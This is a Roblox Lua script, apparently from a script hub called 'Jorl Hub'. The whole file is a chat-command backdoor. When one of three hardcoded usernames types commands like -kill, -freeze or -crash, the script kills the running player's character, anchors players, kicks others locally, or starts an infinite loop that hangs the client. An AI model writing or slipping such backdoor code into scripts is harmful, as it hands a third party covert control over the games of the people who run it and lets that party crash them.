local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Humanoid = LocalPlayer.Character:WaitForChild("Humanoid")

local Usernames = {
    "RizzardOfTheNorth",
    "Roblox",
    "Nobody"
}

local Frozen = {}
local CommandAllowed = true

local function freezePlayer(plr)
    if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
        plr.Character.HumanoidRootPart.Anchored = true
        Frozen[plr.Name] = true
    end
end

local function thawPlayer(plr)
    if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
        plr.Character.HumanoidRootPart.Anchored = false
        Frozen[plr.Name] = nil
    end
end

local function crashPlayer(plr)
    if CommandAllowed and plr == LocalPlayer then
        task.spawn(function()
            while true do
                print("crashed by owner of jorl hub")
            end
        end)
    end
end

local function handleCommand(speaker, message)
    for _, name in ipairs(Usernames) do
        if speaker == name then
            local cmd, targetName = message:match("^%s*%-(%w+)%s+(%S+)")
            if cmd and targetName then
                local target = Players:FindFirstChild(targetName)
                if cmd == "kill" and target == LocalPlayer then
                    Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
                    print("Killed by command from "..speaker)
                elseif cmd == "kick" and target then
                    if target ~= LocalPlayer then
                        target:Kick("Kicked By The Owner Of Jorl Hub")
                        target.Parent = nil
                    end
                elseif cmd == "freeze" and target then
                    freezePlayer(target)
                elseif cmd == "thaw" and target then
                    thawPlayer(target)
                elseif cmd == "crash" and target then
                    crashPlayer(target)
                end
            end
        end
    end
end

local function setupPlayer(plr)
    plr.Chatted:Connect(function(msg)
        handleCommand(plr.Name, msg)
    end)
end

for _, plr in ipairs(Players:GetPlayers()) do
    setupPlayer(plr)
    plr.CharacterAdded:Connect(function(char)
        if Frozen[plr.Name] then
            task.wait(0.1)
            freezePlayer(plr)
        end
    end)
end

Players.PlayerAdded:Connect(function(plr)
    setupPlayer(plr)
    plr.CharacterAdded:Connect(function(char)
        if Frozen[plr.Name] then
            task.wait(0.1)
            freezePlayer(plr)
        end
    end)
end)
